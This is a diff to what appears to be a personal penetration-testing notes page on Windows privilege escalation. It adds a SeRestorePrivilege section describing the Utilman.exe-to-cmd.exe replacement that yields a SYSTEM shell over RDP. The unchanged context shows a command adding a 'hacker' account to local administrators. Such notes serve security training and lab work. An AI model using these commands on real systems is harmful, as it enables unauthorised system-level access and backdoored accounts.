@@ -355,6 +355,22 @@ Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,D
                             <pre><code class="language-bash">.\SeTcb.exe group "cmd /c net localgroup administrators hacker /add" </code></pre>
                         </ul>
 
+                        <h3>SeRestorePrivilege</h3>
+                        <ul>
+                            <p>There are several methods which can be found <a class="notion-link" href="https://www.hackingarticles.in/windows-privilege-escalation-serestoreprivilege/">here</a>here but i haven't tried them yet </p>
+                            <b>This method can only be performed if RDP is enabled in the target box and you are able to access it</b>
+                            <p>You just need to rename the Utilman.exe located at system32 folder</p>
+                            <pre><code class="language-powershell">ren Utilman.exe Utilman.old</code></pre>
+                            <pre><code class="language-powershell">copy cmd.exe Utilman.exe
+#Alternatively instead of copying cmd.exe you can rename it
+ren cmd.exe Utilman.exe</code></pre>
+                            <p>Then just perform an RDP connection</p>
+                            <pre><code class="language-powershell">rdesktop 192.168.118.23</code></pre>
+                            <p>And click the accessibility button in the down right cornet which will trigger the cmd.exe as system user</p>
+                            <img src="/H4ckV4ult/images/protocolsImages/utilman.png" alt="RDP" width="auto" height="200px">  
+
+                        </ul>
+
                         <h3 id="Combination">SeAssignPrimaryTokenPrivilege + SeIncreaseQuotaPrivilege</h3>
                         <ul>
                             <p>If you are being assigned with <b>SeAssignPrimaryTokenPrivilege</b> and <b>SeIncreaseQuotaPrivilege</b>, you can potentially escalate your privileges.</p>
